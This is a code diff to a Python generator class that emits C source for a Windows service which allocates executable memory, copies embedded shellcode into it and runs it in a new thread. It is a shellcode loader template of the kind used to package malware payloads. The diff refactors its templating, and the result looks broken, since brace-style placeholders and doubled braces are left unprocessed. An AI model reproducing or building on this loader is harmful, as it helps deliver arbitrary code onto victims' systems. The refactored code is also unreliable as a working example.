@@ -1,3 +1,5 @@
+from string import Template
+
 class service:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
@@ -16,8 +18,8 @@ class service:
         return ['-municode', 
                 '-mwindows']
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {imports}
 
 
@@ -50,7 +52,7 @@ void runShellcode(){{
     LPVOID buffer = NULL;
     HANDLE hThread = NULL;
     
-    buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, {self.memoryPermission});
+    buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
     memcpy(buffer, shellcode, {shellcodeSize});
     
     hThread = CreateThread(NULL, 0, buffer, NULL, 0, NULL);
@@ -84,8 +86,8 @@ void ServiceMain(DWORD argc, LPWSTR *argv) {{
 }}
 
 int wWinMain(HINSTANCE instance, HINSTANCE previnstance, LPWSTR cmdline, int showcmd) {{
-	SERVICE_TABLE_ENTRY StartTable[] = {{ {{L"{self.servicename}", ServiceMain}}, {{NULL, NULL}} }};
+	SERVICE_TABLE_ENTRY StartTable[] = {{ {{L"$serviceName", ServiceMain}}, {{NULL, NULL}} }};
 	StartServiceCtrlDispatcher(StartTable);
 	return 0;
 }}
-"""
+""").substitute(serviceName=self.servicename, memoryPermission=self.memoryPermission)
